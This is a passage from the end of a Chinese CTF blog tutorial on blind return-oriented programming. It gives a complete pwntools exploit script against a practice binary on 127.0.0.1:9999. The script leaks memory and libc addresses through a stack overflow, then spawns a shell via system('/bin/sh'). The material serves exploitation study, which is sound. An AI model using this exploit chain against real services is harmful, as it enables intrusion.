<h3 id="7、完整EXP"><a href="#7、完整EXP" class="headerlink" title="7、完整EXP"></a>7、完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./brop')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process('./brop')</span></span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process('./brop')</span></span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'a'</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">print</span> content</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success stop gadget addr: 0x%x'</span> % (addr)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_gadget</span><span class="params">(csu_last, csu_middle, saved_addr, arg1=<span class="number">0x0</span>, arg2=<span class="number">0x0</span>, arg3=<span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload = p64(csu_last)  <span class="comment"># pop rbx,rbp,r12,r13,r14,r15, ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)  <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)  <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(saved_addr)  <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)  <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(csu_middle)  <span class="comment"># will call [rbx + r12 * 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>  <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process('./brop')</span></span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process('./brop')        </span></span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_brop_gadget</span><span class="params">(length, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400740</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process('./brop')</span></span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#sh = process('./brop')</span></span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span><span class="params">(length, rdi_ret, puts_plt, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += len(data)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'code'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">#stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">#brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line"><span class="comment">#puts_plt = 0x400560</span></span><br><span class="line"><span class="comment">#leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process('./brop')</span></span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>










        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>hollk</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>一起努力，位列仙班</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"># pwn,栈溢出</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2020/04/29/%E5%A5%BD%E5%A5%BD%E8%AF%B4%E8%AF%9D%E4%B9%8Bret2csu/">好好说话之ret2csu</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© hollk | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
